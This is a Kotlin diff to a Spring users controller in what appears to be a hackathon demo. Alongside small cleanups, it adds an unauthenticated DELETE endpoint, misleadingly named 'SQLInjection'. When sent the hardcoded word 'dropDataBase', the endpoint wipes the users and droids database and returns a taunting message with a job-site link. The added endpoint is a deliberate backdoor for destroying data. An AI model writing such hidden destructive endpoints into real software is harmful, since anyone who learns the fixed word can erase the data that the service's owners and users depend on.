@@ -1,6 +1,5 @@
 package com.bright.hackaton.demo.controller
 
-
 import com.bright.hackaton.demo.facade.UserFacade
 import com.bright.hackaton.demo.model.Leaderboard
 import com.bright.hackaton.demo.model.User
@@ -32,8 +31,9 @@ class UsersController(private val userFacade: UserFacade) {
         value = ["/api/users/{deviceId}"],
         produces = ["application/json"]
     )
-    suspend fun getUserInfo(@PathVariable deviceId: String): ResponseEntity<Any> {
+    suspend fun getUserInfo(@PathVariable deviceId: String): ResponseEntity<User> {
         return ResponseEntity.ok(userFacade.getUserInfo(deviceId))
+
     }
 
     @RequestMapping(
@@ -43,5 +43,17 @@ class UsersController(private val userFacade: UserFacade) {
     )
     suspend fun getLeaderBoard(): ResponseEntity<List<Leaderboard>> {
         return ResponseEntity.ok(userFacade.getLeaderboard())
+    }
+
+    @RequestMapping(
+        method = [RequestMethod.DELETE],
+        value = ["/api/droids/SQLInjection"]
+    )
+    suspend fun SQLInjection(secretWord: String): ResponseEntity<String> {
+        if (secretWord.equals("dropDataBase")) {
+            userFacade.usersAndDroidsCleanupDB()
+            return ResponseEntity.ok("PRODUCTION DB IS GONE! APPLY NOW: https://djinni.co/")
+        }
+        return ResponseEntity.ok("YOU ARE SAFE. FOR NOW...")
     }
 }
